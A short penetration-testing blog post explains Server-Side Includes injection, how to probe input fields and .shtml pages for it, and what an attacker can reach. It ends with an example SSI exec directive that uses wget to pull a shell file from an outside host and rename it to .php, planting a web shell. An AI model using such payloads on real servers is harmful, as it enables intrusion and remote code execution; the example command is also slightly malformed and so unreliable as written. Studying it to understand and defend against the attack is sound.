---
title: SSI
date : 12,sep 2022
categories: [penetration testing, server attack]
tags: [hacking, server, shell]
---
# what is SSI ??
SSIs are directives present on Web applications used to feed an HTML page with dynamic contents. They are similar to CGIs, except that SSIs are used to execute some actions before the current page is loaded or while the page is being visualized. In order to do so, the web server analyzes SSI before supplying the page to the user.

The Server-Side Includes attack allows the exploitation of a web application by injecting scripts in HTML pages or executing arbitrary codes remotely. It can be exploited through manipulation of SSI in use in the application or force its use through user input fields.

It is possible to check if the application is properly validating input fields data by inserting characters that are used in SSI directives, like:

< ! # = / . " - > and [a-zA-Z0-9] 

Another way to discover if the application is vulnerable is to verify the presence of pages with extension .stm, .shtm and .shtml. However, the lack of these type of pages does not mean that the application is protected against SSI attacks.

In any case, the attack will be successful only if the web server permits SSI execution without proper validation. This can lead to access and manipulation of file system and process under the permission of the web server process owner.

The attacker can access sensitive information, such as password files, and execute shell commands. The SSI directives are injected in input fields and they are sent to the web server. The web server parses and executes the directives before supplying the page. Then, the attack result will be viewable the next time that the page is loaded for the user’s browser.

# example 

## Example 1

The commands used to inject SSI vary according to the server operational system in use. The following commands represent the syntax that should be used to execute OS commands.

```bash
<!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" -->
```